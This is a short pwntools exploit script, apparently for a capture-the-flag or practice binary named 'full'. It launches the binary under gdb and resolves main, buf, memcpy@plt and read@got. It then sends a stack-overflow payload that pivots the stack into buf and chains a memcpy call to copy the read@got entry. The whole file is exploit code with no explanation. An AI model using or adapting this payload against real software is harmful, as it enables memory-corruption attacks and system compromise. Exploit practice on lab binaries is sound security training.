from pwn.toplevel import process, p32, ELF
from pwn import *

# context.log_level = 'debug'
context.arch = 'i386'
# context.terminal = ("open-wsl.exe", "-e")

# io = process("./full")
io = process(("gdb", "-q", "./full"))
elf = ELF("./full")
main_addr = elf.symbols["main"]
buf_addr = elf.symbols["buf"]
memcpy_plt = elf.plt["memcpy"]
read_got = elf.got["read"]
leave_ret_addr = 0x080483c5

io.sendlineafter("pwndbg> ", "b *{memcpy_plt}")
io.sendlineafter("pwndbg> ", "r")
io.recvuntil("full \n")



payload = b"a" * 0xe + p32(buf_addr + 0x200 + 4)
payload += b"b" * (0x200 - len(payload)) + p32(memcpy_plt) + p32(4) + p32(read_got) + p32(buf_addr + 0x204)

io.send(payload)
io.interactive()
